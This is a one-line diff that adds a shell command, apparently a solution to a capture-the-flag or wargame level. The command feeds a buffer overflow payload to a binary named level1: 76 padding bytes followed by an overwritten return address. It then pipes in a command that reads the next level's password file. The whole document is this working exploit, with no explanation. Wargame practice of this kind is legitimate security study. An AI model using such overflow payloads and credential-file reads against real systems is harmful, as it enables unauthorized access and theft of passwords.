@@ -1,0 +1,1 @@
+(python -c "print ('A'*76 + '\x44\x84\x04\x08')"; echo cat /home/user/level2/.pass) | ./level1
